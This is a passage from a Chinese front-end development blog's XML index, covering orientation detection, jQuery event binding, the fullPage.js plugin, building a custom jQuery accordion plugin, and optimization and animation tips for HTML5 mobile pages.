    <content type="text"><![CDATA[&emsp;&emsp;在移动端中我们经常碰到横屏竖屏的问题，那么我们应该如何去判断或者针对横屏、竖屏来写不同的代码呢。首先在head中加入如下代码：1&lt;meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/&gt;&emsp;针对上述viewport标签有如下说明1)、content中的width指的是虚拟窗口的宽度。2)、user-scalable=no就一定可以保证页面不可以缩放吗？NO，有些浏览器不吃这一套，还有一招就是minimum-scale=1.0, maximum-scale=1.0 最大与最小缩放比例都设为1.0就可以了。3)、initial-scale=1.0 初始缩放比例受user-scalable控制吗？不一定，有些浏览器会将user-scalable理解为用户手动缩放，如果user-scalable=no，initial-scale将无法生效。4)、手机页面可以触摸移动，但是如果有需要禁止此操作，就是页面宽度等于屏幕宽度是页面正好适应屏幕才可以保证页面不能移动。5)、如果页面是经过缩小适应屏幕宽度的，会出现一个问题，当文本框被激活（获取焦点）时，页面会放大至原来尺寸。一：CSS判断横屏竖屏写在同一个CSS中123456@media screen and (orientation: portrait) &#123;/*竖屏 css*/&#125;@media screen and (orientation: landscape) &#123;/*横屏 css*/&#125;分开写在2个CSS中竖屏1&lt;link rel="stylesheet" media="all and (orientation:portrait)" href="portrait.css"&gt;横屏1&lt;link rel="stylesheet" media="all and (orientation:landscape)" href="landscape.css"&gt;二：JS判断横屏竖屏12345678910//判断手机横竖屏状态：window.addEventListener("onorientationchange" in window ? "orientationchange" : "resize", function() &#123;if (window.orientation === 180 || window.orientation === 0) &#123;alert('竖屏状态！');&#125;if (window.orientation === 90 || window.orientation === -90 )&#123;alert('横屏状态！');&#125;&#125;, false);//移动端的浏览器一般都支持window.orientation这个参数，通过这个参数可以判断出手机是处在横屏还是竖屏状态。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>判断横竖屏</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery中关于on的使用]]></title>
    <url>%2F2015%2F07%2F16%2Fjquery%E4%B8%AD%E5%85%B3%E4%BA%8Eon%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[移除on()所绑定的方法，可以使用off()方法处理12345678$(document).ready(function()&#123;$("p").on("click",function()&#123;$(this).css("background-color","pink");&#125;);$("button").click(function()&#123;$("p").off("click");&#125;);&#125;);事件只需要一次的操作，可以使用one()这个方法12345$(document).ready(function()&#123;$("p").one("click",function()&#123;$(this).animate(&#123;fontSize:"+=6px"&#125;);&#125;);&#125;);trigger()绑定123456789$(selector).trigger(event,eventObj,param1,param2,...)$(document).ready(function()&#123;$("input").select(function()&#123;$("input").after(" Text marked!");&#125;);$("button").click(function()&#123;$("input").trigger("select");&#125;);&#125;);多个事件绑定同一个函数12345$(document).ready(function()&#123;$("p").on("mouseover mouseout",function()&#123;$("p").toggleClass("intro");&#125;);&#125;);多个事件绑定不同函数1234567$(document).ready(function()&#123;$("p").on(&#123;mouseover:function()&#123;$("body").css("background-color","lightgray");&#125;,mouseout:function()&#123;$("body").css("background-color","lightblue");&#125;,click:function()&#123;$("body").css("background-color","yellow");&#125;&#125;);&#125;);绑定自定义事件12345678$(document).ready(function()&#123;$("p").on("myOwnEvent", function(event, showName)&#123;$(this).text(showName + "! What a beautiful name!").show();&#125;);$("button").click(function()&#123;$("p").trigger("myOwnEvent",["Anja"]);&#125;);&#125;);传递数据到函数1234567function handlerName(event)&#123;alert(event.data.msg);&#125;$(document).ready(function()&#123;$("p").on("click", &#123;msg: "You just clicked me!"&#125;, handlerName)&#125;);适用于未创建的元素12345678$(document).ready(function()&#123;$("div").on("click","p",function()&#123;$(this).slideToggle();&#125;);$("button").click(function()&#123;$("&amp;amp;lt;p&amp;amp;gt;This is a new paragraph.&amp;amp;lt;/p&amp;amp;gt;").insertAfter("button");&#125;);&#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>on的使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery全屏滚动插件fullPage.js]]></title>
    <url>%2F2015%2F07%2F16%2Fjquery%E5%85%A8%E5%B1%8F%E6%BB%9A%E5%8A%A8%E6%8F%92%E4%BB%B6fullpage-js%2F</url>
    <content type="text"><![CDATA[&nbsp;简介如今我们经常能见到全屏网站，尤其是国外网站。这些网站用几幅很大的图片或色块做背景，再添加一些简单的内容，显得格外的高端大气上档次。比如 iPhone 5C 的介绍页面（查看），QQ浏览器的官网站。如果你也希望你的网站能设计成全屏的，显得更上档次，你可以试试 fullPage.js。fullPage.js 是一个基于 jQuery 的插件，它能够很方便、很轻松的制作出全屏网站，主要功能有：支持鼠标滚动支持前进后退和键盘控制多个回调函数支持手机、平板触摸事件支持 CSS3 动画支持窗口缩放窗口缩放时自动调整兼容性fullPage.js 支持 IE8+ 及其他现代浏览器。使用方法1、引入文件1234&lt;link rel="stylesheet" href="css/jquery.fullPage.css"&gt;&lt;script src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="js/jquery-ui.min.js"&gt;&lt;/script&gt;&lt;script src="js/jquery.fullPage.js"&gt;&lt;/script&gt;2、HTML123456789&lt;div class="section"&gt;第一屏&lt;/div&gt;&lt;div class="section"&gt;第二屏&lt;/div&gt;&lt;div class="section"&gt;&lt;div class="slide"&gt;第三屏的第一屏&lt;/div&gt;&lt;div class="slide"&gt;第三屏的第二屏&lt;/div&gt;&lt;div class="slide"&gt;第三屏的第三屏&lt;/div&gt;&lt;div class="slide"&gt;第三屏的第四屏&lt;/div&gt;&lt;/div&gt;&lt;div class="section"&gt;第四屏&lt;/div&gt;3、JavaScript123456$(document).ready(function() &#123;$.fn.fullpage(&#123;slidesColor: ['#1bbc9b', '#4BBFC3', '#7BAABE', '#f90'],anchors: ['page1', 'page2', 'page3', 'page4']&#125;);&#125;);经测试，最好至少有 anchors 这个参数，否则在火狐浏览器中，第一次滚动会直接滚到底部。配置1、选项选项类型默认值说明verticalCentered字符串true内容是否垂直居中resize布尔值false字体是否随着窗口缩放而缩放slidesColor函数无设置背景颜色anchors数组无定义锚链接scrollingSpeed整数700滚动速度，单位为毫秒easing字符串easeInQuart滚动动画方式menu布尔值false绑定菜单，设定的相关属性与 anchors 的值对应后，菜单可以控制滚动navigation布尔值false是否显示项目导航navigationPosition字符串right项目导航的位置，可选 left 或 rightnavigationColor字符串#000项目导航的颜色navigationTooltips数组空项目导航的 tipslidesNavigation布尔值false是否显示左右滑块的项目导航slidesNavPosition字符串bottom左右滑块的项目导航的位置，可选 top 或 bottomcontrolArrowColor字符串#fff左右滑块的箭头的背景颜色loopBottom布尔值false滚动到最底部后是否滚回顶部loopTop布尔值false滚动到最顶部后是否滚底部loopHorizontal布尔值true左右滑块是否循环滑动autoScrolling布尔值true是否使用插件的滚动方式，如果选择 false，则会出现浏览器自带的滚动条scrollOverflow布尔值false内容超过满屏后是否显示滚动条css3布尔值false是否使用 CSS3 transforms 滚动paddingTop字符串0与顶部的距离paddingBottom字符串0与底部距离fixedElements字符串无normalScrollElements无keyboardScrolling布尔值true是否使用键盘方向键导航touchSensitivity整数5continuousVertical布尔值false是否循环滚动，与 loopTop 及 loopBottom 不兼容animateAnchor布尔值truenormalScrollElementTouchThreshold整数53、回调函数名称说明afterLoad滚动到某一屏后的回调函数，接收 anchorLink 和 index 两个参数，anchorLink 是锚链接的名称，index 是序号，从1开始计算onLeave滚动前的回调函数，接收 index、nextIndex 和 direction 3个参数： index 是离开的“页面”的序号，从1开始计算； nextIndex 是滚动到的“页面”的序号，从1开始计算； direction 判断往上滚动还是往下滚动，值是 up 或 down。afterRender页面结构生成后的回调函数，或者说页面初始化完成后的回调函数afterSlideLoad滚动到某一水平滑块后的回调函数，与 afterLoad 类似，接收 anchorLink、index、slideIndex、direction 4个参数onSlideLeave某一水平滑块滚动前的回调函数，与 onLeave 类似，接收 anchorLink、index、slideIndex、direction 4个参数Demo演示点此下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>fullPage.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何创建一个自定义jQuery插件]]></title>
    <url>%2F2015%2F07%2F16%2F%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%AE%9A%E4%B9%89jquery%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[简介&emsp;&emsp;jQuery 库是专为加快 JavaScript 开发速度而设计的。通过简化编写 JavaScript 的方式，减少代码量。使用 jQuery 库时，您可能会发现您经常为一些常用函数重写相同的代码。如果这样的话，这可能就是您需要编写自定义 jQuery 插件的一个原因。&emsp;&emsp;jQuery 插件允许您使用自定义代码扩展 jQuery 库；您可以对一些重复性函数使用插件。例如，很多插件可供幻灯片、下拉菜单和折叠菜单所用。如果您搜索 jQuery 插件，就会发现有大量可用于自己项目的示例（看看它们是如何构建的）。常用缩略词CSS：层叠样式表HTML：超文本标记语言&emsp;&emsp;在本文中，您将学习如何快速创建一个自定义 jQuery 插件。示例代码和逐步操作将为您演示如何创建一个 jQuery accordion 插件。如果您了解 jQuery，而且准备让您的技能再上一个台阶，这篇文章非常适合您。您可以在此 下载 本文所用的示例源代码。今天来介绍一下如何创建一个自定义jQuery插件。前篇&emsp;&emsp;jQuery 库是专为加快 JavaScript 开发速度而设计的。通过简化编写 JavaScript 的方式，减少代码量。使用 jQuery 库时，您可能会发现您经常为一些常用函数重写相同的代码。如果这样的话，这可能就是您需要编写自定义 jQuery 插件的一个原因。&emsp;&emsp;jQuery 插件允许您使用自定义代码扩展 jQuery 库；您可以对一些重复性函数使用插件。例如，很多插件可供幻灯片、下拉菜单和折叠菜单所用。如果您搜索 jQuery 插件，就会发现有大量可用于自己项目的示例（看看它们是如何构建的）。准备工作&emsp;&emsp;对JavaScript、jQuery 和CSS有一个基本了解。（用到的源代码及示例在本文最下方）开始&emsp;&emsp;jQuery 是一个可扩展 JavaScript 语言的库。当您创建一个 jQuery 插件时，本质上是在扩展这个 jQuery 库。要真正了解插件如何扩展 jQuery 库需要对 JavaScript prototype 属性有一个基本了解。尽管不直接使用，但是 JavaScript prototype 属性可通过 jQuery 属性 fn 在后台使用，这是原生 JavaScript prototype 属性的一个 jQuery 别名。要使用 fn 属性创建一个新 jQuery 插件，只需要为 fn 属性分配一个插件名，并将其指向一个充当构造函数的新函数，类似于纯 JavaScript。Code 1显示了如何定义一个名为 accordion 的新 jQuery 插件，其方法是通过使用 jQuery 对象和 fn 属性，并将其分配给一个新的构造函数。Code 1：定义一个名为 accordion 的新 jQuery 插件123jQuery.fn.accordion = function() &#123;// 在这里添加插件代码&#125;;Code 1 展示了创建 jQuery&emsp;&emsp;插件的一种方法；该示例没有什么功能性错误。但是，创建一个 jQuery 插件所推荐的方法是，先创建一个允许使用美元符号 ($) 的包装器函数。在默认情况下，美元符号可能与其他 JavaScript 框架发生冲突，如果将插件包装在一个函数中，就不会出现冲突。Code 2 中的示例代码显示如何将一个包装器函数应用到一个 jQuery 插件定义中。12345(function($) &#123;$.fn.accordion = function() &#123;// 在这里添加插件代码&#125;;&#125;)(jQuery);&emsp;&emsp;在Code 2 中，jQuery 关键字被应用到包装器函数中，这允许您在插件中使用美元符号，就像使用 fn 属性时那样。包装器函数就绪后，就可以在整个插件的任何地方使用美元符号代替 jQuery 关键字，不会干扰其他第三方插件。该选项提供了一种方法使我们可以在开发整个插件中编写较少的代码，并且有助于您的插件代码保持整洁，易于维护。维护链接性&emsp;&emsp;jQuery 的一个优势是允许您使用任何类型的选择器。但是，必须记住，您的插件可以处理几种不同的元素类型。使用 this 关键字允许您的插件应用于相关函数，通过循环实现每个元素的访问，而不考虑元素类型。如果在 each 循环前使用 return 关键字，就可以使用您的插件维护链接性。清单 3 显示了分配给一个函数处理程序且与 return 关键字相结合的 each 循环。code 3. 在 each 循环之前使用 return 关键字1234567(function($) &#123;$.fn.accordion = function() &#123;return this.each(function() &#123;// 使用 return&#125;);&#125;;&#125;)(jQuery);&emsp;&emsp;有了Code 3 的代码后，示例 accordion 插件可用在一个方法调用链中。有了链接性（另一个强大的 jQuery 特性），您的插件就可用在一个方法调用链中。例如，下面的代码显示了如何淡出HTML元素，并在单一的方法调用链中将其从文档对象模型 (DOM) 中删除。$(&quot;#my-div&quot;).fadeOut().remove();构造一个 accordion&emsp;&emsp;一个典型的层叠设计包括标题栏和相关内容区域。定义列表是一个可供 accordions 使用的很好的 HTML 结构；dt 元素供标题所用，而dd 元素供内容区域所用。清单 4 中的 HTML 结构是一个定义列表，含有四个标题以及相应的内容区域。Code 4. 单一方法调用链12345678910&lt;dl class="accordion" id="my-accordion"&gt;&lt;dt&gt;第1部分&lt;/dt&gt;&lt;dd&gt;内容一&lt;/dd&gt;&lt;dt&gt;第2部分&lt;/dt&gt;&lt;dd&gt;内容二&lt;/dd&gt;&lt;dt&gt;第3部分&lt;/dt&gt;&lt;dd&gt;内容三&lt;/dd&gt;&lt;dt&gt;第4部分&lt;/dt&gt;&lt;dd&gt;内容四&lt;/dd&gt;&lt;/dl&gt;&emsp;&emsp;Code 4 中定义的列表也有一个分配给它的名为 accordion 的 CSS 类。没有应用任何 CSS，这个 accordion 结构看起来类似于图 1 中的基础设计为了美观，我们再给Code 4中的Html美化一下，并命名为“jquery.accordion.css”Code 5. CSS部分12345678910111213141516171819202122.accordion &#123;width: 500px;border: 1px solid #ccc;border-bottom: none;font-family: Arial, Helvetica, sans-serif;font-size: 12px;&#125;.accordion dt,.accordion dd &#123;border-bottom: 1px solid #ccc;margin: 0px;&#125;.accordion dt &#123;background: #eaeaea;cursor: pointer;padding: 8px 4px;font-size: 13px;font-weight: bold;&#125;.accordion dd &#123;padding: 12px 8px;&#125;效果如下图：自定义插件&emsp;&emsp;要制作一个功能性accordion，必须将自定义代码应用到您上一小节创建 jQuery 插件的函数。accordion 插件从遍历所有已定义的 accordion 开始。要定义一个 accordion，在 HTML 文档或外部嵌入式 JavaScript 文件中使用下列 jQuery。1$('dl#my-accordion').accordion();&emsp;&emsp;对于每个 Accordion，您可以使用 jQuery 的 children 方法访问相关定义的标题，返回一个数组或 dt 元素。应用一个 click 事件到 dt 元素，然后一个名为 reset 方法应用到每个 dt。accordion 首次加载时，该 reset 方法会折叠所有 dd 元素。单击 dt 元素或者标题栏时，click 事件会触发一个名为 onClick 的自定义方法。自定义 onClick 方法用于查找 accordion 中的所有 dt 元素。它调用一个自定义 hide 方法，该方法通过使用 next 方法找到紧挨着 dt 元素的 dd 元素，隐藏每个相关的 dd 元素，通过使用 next 方法找到紧挨着 dt 元素的 dd 元素，然后向上滑动激活它。所有 dd 元素被隐藏后，使用 slideDown 方法，就可以看见与单击过的 dt 元素相关的 dd 元素，并创建一个放大和收缩动画，如清单 8 所示。onClick 方法的最后一行代码是 return false，确保任何被点击的主题栏没有显现出其一般行为。例如，如果您使用一个 anchor 元素作为标题栏，您可能想要执行 return false，这样就不会将用户定向到另一个页面或现有页面的一部分。Code 6. 自定义用于创建一个 jQuery 插件的 accordion 函数1234567891011121314151617181920212223(function($) &#123; $.fn.accordion = function(options) &#123; return this.each(function() &#123; var dts = $(this).children('dt'); dts.click(onClick); dts.each(reset); &#125;); function onClick() &#123; $(this).siblings('dt').each(hide); $(this).next().slideDown('fast'); return false; &#125; function hide() &#123; $(this).next().slideUp('fast'); &#125; function reset() &#123; $(this).next().hide(); &#125; &#125;&#125;)(jQuery);&emsp;&emsp;如果该accordion插件与一个HTML定义列表结构相关联时，比如您之前创建的那个 accordion 函数将被应用。有了 accordion 函数，单击一个标题栏或 dt 元素时，会打开其内容区域，而其他内容区域则关闭。换句话说，一次只能打开一个内容区域。设定插件的默认值（Defaults）和设置项（options）&emsp;&emsp;jQuery 插件可以包括 defaults 和 options。Options 本质上就是传递给插件的参数。可以使用 options 发送一个参数作为 object literal，这是一个标准 jQuery 实践，而不需要传递多个参数。如果您的插件支持 options，使用 defaults 对象设置默认的 options 将是一个最佳方式。和 options 一样，defaults 是一个 object literal，应该包括您想要传递到插件中的属性。例如，如果您支持一个可用于在首次加载时打开 accordion 第一个内容区域的属性，那么在您的插件中应该包括一个 open 属性的默认值。在您的插件中使用 defaults 确定默认函数，使用 options 覆盖默认值。如果插件接收 options，可以使用 $.extend 方法执行覆盖。jQuery 的 $.extend 方法合并两个或多个对象。Code 7 中的示例显示在一个自定义 jQuery 插件中使用 $.extend 方法合并用户定义选项和默认选项的一般实现。Code 7. 向一个自定义的 accordion jQuery 插件添加 options 和 defaults12345678910111213141516171819202122232425(function($) &#123;$.fn.accordion = function(options) &#123;var settings = $.extend(&#123;&#125;, &#123;open: false&#125;, options);return this.each(function() &#123;var dts = $(this).children('dt');dts.click(onClick);dts.each(reset);if(settings.open) $(this).children('dt:first-child').next().show();&#125;);function onClick() &#123;$(this).siblings('dt').each(hide);$(this).next().slideDown('fast');return false;&#125;function hide() &#123;$(this).next().slideUp('fast');&#125;function reset() &#123;$(this).next().hide();&#125;&#125;&#125;)(jQuery);&emsp;&emsp;$.extend 方法参数是一个目标对象和 2 个或多个合并对象。在本示例中，目标对象是一个空 object literal，充当合并对象容器。目标将成为一个包含合并对象值的单一对象（在该案例中是 settings 变量）。第 2 个参数是一个包含默认插件属性的 object literal。第 3 个参数是用户定义的 options 参数。要在一个 HTML 元素上使用 accordion 插件传递 options，需要知道除了之前您作为 object literal 传递的属性外还有哪些属性，如下所示。1$('dl#my-accordion').accordion(&#123;open:true&#125;);&emsp;&emsp;在Code 7 示例中，传递到插件的 options 通过 $.extend 方法覆盖 defaults。如果没有传递 options，则使用默认值。对于示例插件，可使用 open 属性确定加载时是否打开第一个内容区域。可重用性&emsp;&emsp;您可以在任何 HTML 文档中重用示例 accordion 插件，可以在单个 HTML 文档中多次使用。您也可以包括多个 accordion 结构，就像已创建的那个 accordion，使用刚创建的新 accordion 插件通过 jQuery 将每个单独定义为 accordion。要向一个 HTML 文档添加多个 accordion，只需要添加尽可能多的 accordion 结构。Code 8 中的代码包括两个 accordion 结构，由一个段落隔开。Code 8. 在同一个 HTML 文档中使用多个 accordion12345678910111213141516171819&lt;dl class="accordion" id="my-accordion"&gt;&lt;dt&gt;第1部分&lt;/dt&gt;&lt;dd&gt;内容一&lt;/dd&gt;&lt;dt&gt;第2部分&lt;/dt&gt;&lt;dd&gt;内容二&lt;/dd&gt;&lt;dt&gt;第3部分&lt;/dt&gt;&lt;dd&gt;内容三&lt;/dd&gt;&lt;dt&gt;第4部分&lt;/dt&gt;&lt;dd&gt;内容四&lt;/dd&gt;&lt;/dl&gt;&lt;dl class="accordion" id="my-accordion"&gt;&lt;dt&gt;第5部分&lt;/dt&gt;&lt;dd&gt;内容五d&gt;&lt;dt&gt;第6部分&lt;/dt&gt;&lt;dd&gt;内容六dd&gt;&lt;dt&gt;第7部分&lt;/dt&gt;&lt;dd&gt;内容七/dd&gt;&lt;/dl&gt;&emsp;&emsp;Code 8 中的两个 accordion 结构几乎一样，除了内容不一样外，更重要的是 ID 值也不一样。第一个结构包含一个 my-accordion ID 值。第 2 个结构包含一个 my-accordion2 ID 值。现在可以单独定向这些结构。例如，下列 jQuery 脚本使用已创建的新插件将每个 accordion 结构定义为一个 accordion。12$('dl#my-accordion').accordion(&#123;open:true&#125;);$('dl#my-accordion2').accordion(&#123;open:true&#125;);&emsp;&emsp;两个 accordion 结构定义完成后，第一个面板默认设置为打开下图 显示一个用在同一个 HTML 文档的多个 accordion 插件的示例。演示地址：http://demo.grycheng.com/case/custormJq/下载地址：custormJq.zip]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jQuery插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转HTML5移动页面(优化篇)]]></title>
    <url>%2F2015%2F07%2F15%2F%E7%8E%A9%E8%BD%AChtml5%E7%A7%BB%E5%8A%A8%E9%A1%B5%E9%9D%A2%E4%BC%98%E5%8C%96%E7%AF%87%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;承接上文《[玩转HTML5移动页面（动效篇）]，上次说的是让页面动起来的一些小技巧。而页面动起来的根基是功能可用的页面，因此有必要分享一些优化细节的技巧和方向，熟悉掌握一些方法论还是会对页面开发大大提高效率的，并且也能防止疏忽缺漏。====前方高能====（1） 动画雪碧图&emsp;&emsp;涉及的动画十分多，用的元素也十分多，请务必使用雪碧图（Sprite）！&emsp;&emsp;网上的工具有一些可以帮助你生成雪碧图的工具，例如CssGaga，GoPng等等，自动化构建工具Grunt和Gulp也提供了相应插件。&emsp;&emsp;特别地，如果单张雪碧图面积实在太大，可以拆分雪碧图，例如拆分成2-4张，因为现代浏览器都支持4-6个同源请求下载，若资源实在太多，也可以考虑把静态资源放在不同源域名下去请求，这里牺牲多几个请求换来图片同时加载比一张图片慢慢加载要好，当然，这需要具体情况去衡量。&emsp;&emsp;顺便提一下，我写动画的一个小技巧是把每一页的动画分在一个import.css里面，然后最后在主样式中import进去，这样方便调试动画，也容易维护，例如：123456//style.css@import url("reset.import.css");@import url("loading.import.css");@import url("m-animate-1.import.css");@import url("m-animate-2.import.css");@import url("m-animate-3.import.css");&emsp;&emsp;当然，import不是原生支持的，这里需要一些流程化工具让import的页面在输出之前经过组装-压缩的步骤。（2）图片压缩&emsp;&emsp;图片压缩是老生常谈，但是仍然有不少人忘记压缩，那可是活生生的带宽和流量的浪费啊…压缩图片需要有好工具，有智图，TinyPNG，JPEGmini等等。依靠工具外，还有以下方式可以优化图片：1.尽量避免用PNG24。如果图片色彩要求不高，请使用PNG8；2.使用新格式，WEBP和BPG等新格式的到来，在不用考虑兼容的情况下请大胆尝试；3.用SVG和ICONFONT代替简单的图标；4.用FUFU的字蛛来代替艺术字体切图。（3）多终端兼容&emsp;&emsp;多终端兼容是一切的根基，要知道有人拿着肾6+，有人拿着肾4，大则414×736，小则320×416（IPHONE4在SAFARI保留上下端导航），因此多终端兼容是十分必要的。&emsp;&emsp;曾经有一种派系为320派系，就是大部分页面都是320宽度，因此干脆直接用320的容器来包一切页面，那样也简单，然而IPHOEN6和IPHONE6+的出现简直是灭了这个派系。那么到底要如何兼容呢？这里我分了三个时期来说说：A.设计初期&emsp;&emsp;先审视设计稿，因为320派系的原因，大部分设计稿只考虑到IPHONE5来设计，因此很多背景元素是只有320px宽度（页面实际渲染宽度），例如下图。&emsp;&emsp;那么，这时候就需要设计提供一个较长的延伸背景了，最好是可以重复的，用background-repeat可以减少图片大小。B.设计中期也就是具体的兼容方法，可以使用CSS3 Media Query和类覆盖。1.CSS3 Media Query，按范围兼容机型。1234567891011/*iphone6*/@media only screenand (min-device-width : 375px)and (max-device-width : 667px)and (orientation : portrait)and (-webkit-min-device-pixel-ratio : 2)&#123;.page6 .ele-building&#123;top: 69px;&#125;.page6 .ele-runner&#123;top: 100px;&#125;.page6 .ele-pophome&#123;top: 16px;&#125;&#125;2.类覆盖，这种方式适合直接为小屏或大屏做整体兼容。首先，为小屏（大屏）加一个识别类，这里小于420表示为小屏幕（IPHONE4有上下导航栏）：12345var bh = $(window).height();// 480 - 64 = 416 iphone4if(bh&amp;amp;lt;420)&#123;$('body').addClass('low-screen');&#125;然后，对应识别类加上要变动的元素覆盖，例如：12.page6 .ele-bg&#123;top: 10px;&#125;.low-screen .page6 .ele-bg&#123;top: 0px;&#125;C.设计后期&emsp;&emsp;这是最后一步，整体检查和体验，这里面会暴露一些问题，例如元素在IPHONE6P显得小了或者元素在IPHONE4挤不下了，可以来最后大招解决：1.大屏适当用zoom:(倍率)或者transform:scale(倍率)来增大元素，实测失真根本看不出来，设计师也满意（毕竟不用多做一张图！）；2.小屏适当去掉一些元素，例如一些翻页提示，一些多余图标，可以让优雅降级，把它们 display:none掉。有以上几步，基本就能兼容大部分机器了。兼容一直是个苦活，但是这是前端必修课，多练就会发觉其实也没有那么难嘛。（4）交互提示&emsp;&emsp;前面说了，加了音效就要加上音乐切换开关的按钮，不然会被用户骂死。还有其他，例如如果你的页面不能兼容横屏，请监听横屏状态，然后加上适当的横屏提示。例如：1234567891011// 横屏监听var updateOrientation = function()&#123;if(window.orientation=='-90' || window.orientation=='90')&#123;$('.landscape-wrap').removeClass('hide');console.log('为了更好的体验，请将手机/平板竖过来！');&#125;else&#123;$('.landscape-wrap').addClass('hide');console.log('竖屏状态');&#125;&#125;;window.onorientationchange = updateOrientation;提示越多，界面越友好，有时候设计师会漏掉一些可能出现的页面情况。作为有态度的前端，请好好把关，让用户有好的体验。（5）分享接口H5做好了，要传播分享才能展示你的牛逼轰轰。然而分享其实是个坑，分享到微信、手Q等都有各种问题。A.微信旧微信会使用WeixinJSBridge来声明分享的缩略图、标题、正文等，比较方便。例如：而最新的微信提供了新的微信SDK，需要在公众账号绑定所属域名之后调用SDK作分享，可以说分享功能会更加强大，坑也会更加少。B.手Q手Q支持声明meta标签的的分享方式，例如：而若在qq.com域名下也支持api的定义方式。C.一般化分享在默认兼容旧版微信、手Q或者各种浏览器，平台，可以用这样的方法：写h1做标题，p做内容，img做缩略图，只需要把h1隐藏掉就好，这里的缩略图最好要大于200x200px。例如：当然，这样也有利于搜索引擎拉取信息。&emsp;&emsp;分享的坑还有更多，例如不同浏览器例如QQ浏览器、Chrome也会有自己的默认拉取方式（部分截图作缩略图），需要多加测试优化。（5）SEO搜索引擎优化SEO（搜索引擎优化）的基本做法是把页面结构写好，这包括：1.定义精确的网页标题&emsp;&emsp;你的标题应该有概括性，能明确告知搜索引擎和用户你的网站大概内容和目的，可以是当前页面标题-所属类型-产品名，例如“全民来猜歌-年费黄钻-QQ空间”。2.针对页面内容补充description和keywords的meta标签&emsp;&emsp;你需要简短总结页面的主要目标，然后补充description，以及根据关键词补充keywords。3.优化你的超链接和图片&emsp;&emsp;包括优化超链接显示的文本，要具有语义性也要跟超链接的网页具有相关性，例如“空间主页”就不要链接到“www.qq.com”。同时，要补充”title”和”alt”属性，例如“&lt;img src=’images/apple.jpg’ title=’苹果示例图’ alt=’苹果示例图’ /&gt;”。4.建立良好的网站导航和sitemap&emsp;&emsp;网站需要有一个良好的导航，控制根目录和各子目录的关键，通过sitemap可以帮助网站主了解网站结构，也方便搜索引擎收录整个站点。5.优化目录结构和URL&emsp;&emsp;你的URL应该有语义性，简短易懂，例如http://www.apple.com/macbook-air/，而且每一层级都要有它对应的页面展示以及语义。6.善用h1-h6的标题结构树&emsp;&emsp;合理的标题可以强调文字，也能让搜索引擎更加了解到各标题的重要性，因此建立良好的标题树十分有意义。7.不断致力于提供优质的内容&emsp;&emsp;社交化分享是网站曝光最快的因素，因此不断提供了优质原创内容才能真正提高你的网站曝光权重。（6）无障碍&emsp;&emsp;无障碍的普及是一件好事，这让互联网真正地为所有人可用。因此我们也应该为之而努力，无障碍的根基是你页面强壮的语义性和结构性，具体可以参考《腾讯网无障碍说明》了解无障碍的优化手段。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>html5移动页面</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转HTML5移动页面(动效篇)]]></title>
    <url>%2F2015%2F07%2F15%2F%E7%8E%A9%E8%BD%AChtml5%E7%A7%BB%E5%8A%A8%E9%A1%B5%E9%9D%A2%E5%8A%A8%E6%95%88%E7%AF%87%2F</url>
    <content type="text"><![CDATA[1.快速输出静态页面2.加上高级大气上档次狂拽炫酷屌炸天的动画让页面动起来&emsp;&emsp;&emsp;作为一个有志向的前端，当然是选2啦！可是需求时间又很短很短，怎么办呢？&emsp;&emsp;这次就来谈谈一些动画设计的小技巧，能在你时间不多又没有动画想法的时候瞬间让页面增色不少。&emsp;&emsp;同时也会谈及移动端H5页面的优化细节与关键点，因此本文章将分为动效篇和优化篇。====前方高能====（1） CSS3时序错开渐显动画&emsp;&emsp;&emsp;这是一种比较常用的动画，它的优点是节奏感强，做法就是先让每个元素隐藏，然后当页面呈现后每个元素错开时间出现。例子（忽略兼容前缀和无关属性）：&emsp;&emsp;效果就是两个元素分别从上面掉下来，这里有个小细节（keyframes），为了让掉下来的动画生动点，应该是在90%的时候先掉下一点点，然后瞬间在100%时回跳5px。&emsp;&emsp;还有个细节，安卓2.3.*不能良好支持-webkit-animation-fill-mode，也就是渐变动画不能停止在最后一帧。有这样一个解决方案：1.用Modernizr去检测是否支持这个属性，加上识别类.no-animation-fill-mode；2.根据识别类采取以下措施：（1）用js模拟同样效果；（2）用css屏蔽掉动画；（3）或者直接全部都用transition来做（不要keyframes）。示例页面如下2） CSS3细节强调动画&emsp;&emsp;一些局部细节如果还是渐现显示，会枯燥没什么感觉，例如标题、按钮等，需要一种强调。分两种情况：1.如果时间允许的话，基本做法是先把一个元素切成不同的块状，例如小人的手脚都切成不同图片，然后让它们重新组合，再通过赋予不同的CSS动画来让它生动起来，这里引用个webank的例子：2.如果时间紧凑，又不像桑尼一样擅长于动画细节，可以使用一些辅助工具：Animate.css，通过直接预览选择想要的动效，然后下载它的CSS把对应的keyframe扒下来就好了（引用整个CSS是资源浪费）。（3）SVG动画&emsp;&emsp;SVG技术越来越不陌生，使用门槛也渐渐降低，而且SVG动画还可以使用CSS控制。先看个生日页面，是个SVG的蛋糕：可见SVG是很强大的！弥补了CSS3的不足。&emsp;&emsp;然而这种动画也是略耗时，但有一种比较常用的，就是线条的描绘动画，CSS3比较难实现，这里可以用SVG，看图：&emsp;&emsp;介绍一个PS插件svgArtisan（目前还未有主页），这个工具可以直接根据PSD的路径图层生成SVG图形。&emsp;&emsp;接下来就简单了，将设计稿上的路径图形用插件生成对应的SVG，例如是这样的：（注意，其中的foreignObject标签内是不支持svg的浏览器会看到一张.m3-svg-nosupport标签下的图片。）再使用CSS3的animation控制stroke-dashoffset：效果不难吧！SVG还有各种用途，例如制作ICONFONT等，可以深入挖掘。（4）